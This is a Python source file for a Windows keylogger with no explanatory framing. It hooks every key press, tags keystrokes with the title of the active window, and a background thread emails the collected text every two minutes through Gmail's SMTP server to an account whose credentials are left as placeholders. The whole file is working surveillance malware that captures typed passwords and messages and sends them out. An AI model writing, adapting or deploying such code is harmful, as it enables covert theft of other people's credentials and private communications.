from keyboard import on_press, wait
from win32gui import GetWindowText, GetForegroundWindow
from threading import Thread
from time import sleep
import datetime
import smtplib

data = ''
lastwindow = ''

def send_mail():
    global data
    while True:
        if len(data) > 50:
            timeInSecs = datetime.datetime.now()
            SERVER = "smtp.gmail.com"
            PORT = 587
            PASS = PAS
            FROM = FRM
            TO = FRM
            SUBJECT = "B33: "
            MESSAGE =  data 

            message_payload = "\r\n".join((
                                "From: %s" %FROM,
                                "To: %s" %TO,
                                "Subject: %s" %SUBJECT,
                                "",
                                MESSAGE))
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(FROM, PASS)
                server.sendmail(FROM, TO, message_payload)
                data = ''
                server.quit()
            except Exception as error:
                print (error)
        sleep(120)


def display(event, key):
    global data, lastwindow
    if lastwindow != GetWindowText(GetForegroundWindow()):
        lastwindow = GetWindowText(GetForegroundWindow())
        data += ' [ ' + lastwindow + ' ] '
        if key == 'tab' or key == 'caps lock' or key == 'shift' or key == 'ctrl' or key == 'alt' or key == 'space' or key == 'right alt' or key == 'right ctrl' or key == 'esc' or key == 'left' or key == 'right' or key == 'down' or key == 'up' or key == 'right shift' or key == 'enter' or key == 'backspace' or key == 'num lock' or key == 'page up' or key == 'page down' or key == 'insert' or key == 'delete' or key == 'print screen' or key == 'home' or key == 'end' or key == 'decimal':
            data += ' { ' + str(key) + ' } '
        else:
            data += key    
    elif key == 'tab' or key == 'caps lock' or key == 'shift' or key == 'ctrl' or key == 'alt' or key == 'space' or key == 'right alt' or key == 'right ctrl' or key == 'esc' or key == 'left' or key == 'right' or key == 'down' or key == 'up' or key == 'right shift' or key == 'enter' or key == 'backspace' or key == 'num lock' or key == 'page up' or key == 'page down' or key == 'insert' or key == 'delete' or key == 'print screen' or key == 'home' or key == 'end' or key == 'decimal':
        data += ' { ' + str(key) + ' } '
    else:
        data += key
        
def KeyPressed(event):
    display(event, event.name)
    
    

if __name__ == '__main__':
    triggerThread = Thread(target=send_mail)
    triggerThread.start()

on_press(KeyPressed)
wait()

